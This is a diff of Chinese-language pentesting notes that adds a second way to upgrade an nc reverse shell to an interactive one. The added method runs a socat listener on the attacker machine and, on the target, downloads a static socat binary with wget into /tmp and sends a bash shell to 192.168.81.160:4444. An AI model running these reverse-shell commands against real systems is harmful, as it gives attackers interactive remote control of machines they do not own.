@@ -128,12 +128,28 @@ list
 ```
 reverse 112.55.4.22 56789
 ```
-nc获得shell后，kali/ubuntu可通过如下命令升级交互式shell
+nc获得shell后，kali/ubuntu可通过如下命令升级交互式shell  
+方法一：  
 ```
 $ python -c 'import pty; pty.spawn("/bin/bash")'
 Ctrl-Z
 $ stty raw -echo
 $ fg
+```
+方法二： 
+```
+攻击机：
+# 首先安装
+$ sudo apt install socat
+# 执行
+$ socat file:`tty`,raw,echo=0 tcp-listen:4444
+目标机
+
+# 把socat上传到目标机器上或者直接下载
+$ wget https://github.com/andrew-d/static-binaries/raw/master/binaries/linux/x86_64/socat -O /tmp/socat
+# 运行
+$ chmod +x /tmp/socat
+$ /tmp/socat exec:'bash -li',pty,stderr,setsid,sigint,sane tcp:192.168.81.160:4444
 ```
 # systemd-resolve占用53端口的解决方法
 以ubuntu为例，编辑
